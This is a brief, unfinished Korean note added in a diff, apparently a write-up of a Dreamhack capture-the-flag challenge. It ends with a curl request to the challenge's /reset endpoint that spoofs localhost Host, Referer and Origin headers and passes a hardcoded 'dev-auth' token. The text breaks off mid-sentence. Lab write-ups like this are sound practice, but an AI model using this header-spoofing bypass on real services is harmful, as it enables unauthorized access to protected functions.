@@ -1,0 +1,14 @@
+흐어미 빡세다 처음으로 풀어본 Level2 짜리 문제네
+
+대략적으로만 풀이하자면 가상 서버에서 문제를 푸는데 722개짜리 문제가 있음 이걸 하나도 틀리지
+
+
+
+
+
+
+
+
+curl -X GET "http://host3.dreamhack.games:14946/reset" -H "Host: 127.0.0.1" -H "dev-auth: 1q2w3e4r_solideo!!" -H "Referer: http://127.0.0.1/" -H "Origin: http://127.0.0.1
+
+
